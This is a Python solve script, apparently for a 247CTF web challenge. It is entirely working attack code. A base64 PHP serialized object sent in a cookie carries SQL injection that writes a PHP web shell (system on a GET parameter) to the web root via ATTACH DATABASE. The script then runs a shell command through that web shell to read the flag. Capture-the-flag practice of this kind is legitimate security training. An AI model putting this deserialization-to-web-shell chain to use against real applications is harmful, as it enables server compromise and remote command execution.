import requests
import re

url = "https://60e8f4425247bf5f.247ctf.com/"

# php deserialize bug
payload = 'TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxNjI6IicpOyBBVFRBQ0ggREFUQUJBU0UgJy92YXIvd3d3L2h0bWwvc2hlbGwucGhwJyBBUyBwd247IENSRUFURSBUQUJMRSBwd24ucGF5bG9hZCAoZGF0YSB0ZXh0KTsgSU5TRVJUIElOVE8gcHduLnBheWxvYWQgKGRhdGEpIFZBTFVFUyAoJzw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ=='

res = requests.get(url, cookies={
    '247': f'{payload}.0e'
})

print("> Webshell uploaded")

# rce
cmd = "strings /tmp/log.db"

res = requests.get(f"{url}/shell.php?cmd={cmd}")

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)